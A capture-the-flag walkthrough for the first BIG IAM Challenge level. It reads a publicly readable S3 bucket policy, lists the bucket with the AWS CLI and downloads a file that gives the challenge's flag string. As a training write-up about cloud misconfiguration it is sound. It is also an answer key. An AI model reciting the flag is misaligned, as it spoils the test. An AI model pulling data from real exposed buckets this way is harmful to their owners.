---
tags:
  - IAM
  - S3
title: The BIG IAM Challenge - Buckets of Fun
description: Public buckets are risky
reference: https://thebigiamchallenge.com/challenge/1
---

## Challenge

We all know that public buckets are risky. But can you find the flag?

## Solution

### 1. view the provided IAM policy

The S3 bucket `thebigiamchallenge-storage-9979f4b` is publicly accessible.

```
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*" }, { "Effect": "Allow", "Principal": "*", "Action": "s3:ListBucket", "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b", "Condition": { "StringLike": { "s3:prefix": "files/*" } } } ] }
```

### 2. Explore the S3 bucket and download the flag file

```
> aws sts get-caller-identity

{

    "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",

    "Account": "657483584613",

    "Arn": "arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"

}

> aws s3 ls thebigiamchallenge-storage-9979f4b

                           PRE files/

> aws s3 ls thebigiamchallenge-storage-9979f4b/files/

2023-06-05 19:13:53         37 flag1.txt

2023-06-08 19:18:24      81889 logo.png

> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag1.txt

Completed 37 Bytes/37 Bytes (601 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt t

o ../../tmp/flag1.txt

> cat /tmp/flag1.txt

{wiz:exposed-storage-risky-as-usual}
```
